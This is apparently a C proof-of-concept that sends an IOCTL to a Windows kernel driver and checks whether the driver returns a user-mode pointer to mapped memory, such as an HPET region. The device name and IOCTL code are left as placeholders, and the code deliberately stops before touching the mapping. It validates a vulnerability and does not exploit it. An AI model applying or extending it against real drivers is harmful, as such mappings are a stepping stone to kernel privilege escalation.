// Build with: cl /W4 /EHsc poc.c
/*
Replace DEV_PATH and IOCTL_TEST with your device name and the IOCTL that routes to sub_140003190.
*/
#include <windows.h>
#include <stdio.h>

#define DEV_PATH        L"\\\\.\\<YourDeviceName>"   // e.g., \\.\MyDrv
#define IOCTL_TEST      CTL_CODE(FILE_DEVICE_UNKNOWN, 0x<XXX>, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _OUT12 {
    ULONGLONG UserPtr;   // driver writes user-mode pointer here
    DWORD     Reserved;  // padding/alignment (unused)
    DWORD     Length;    // size the driver says it mapped
} OUT12;

int wmain(void) {
    HANDLE h = CreateFileW(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        wprintf(L"CreateFile failed: %lu\n", GetLastError());
        return 1;
    }

    BYTE inSelector = 3;              // 1..4 per your analysis (e.g., 3 = HPET path)
    OUT12 out = {0};
    DWORD bytes = 0;

    BOOL ok = DeviceIoControl(h,
                              IOCTL_TEST,
                              &inSelector, sizeof(inSelector),   // input = 1 byte
                              &out,        sizeof(out),          // output = 12 bytes
                              &bytes, NULL);

    DWORD err = ok ? 0 : GetLastError();
    printf("DeviceIoControl ok=%d err=%lu bytes=%lu\n", ok, err, bytes);
    printf("Returned: UserPtr=0x%llx Length=%u\n",
           (unsigned long long)out.UserPtr, out.Length);

    // SAFETY: Do NOT dereference `out.UserPtr`. Do NOT write to it.
    // The presence of a non-null user-mode pointer + plausible Length
    // is sufficient to validate the vulnerability.

    CloseHandle(h);
    return 0;
}
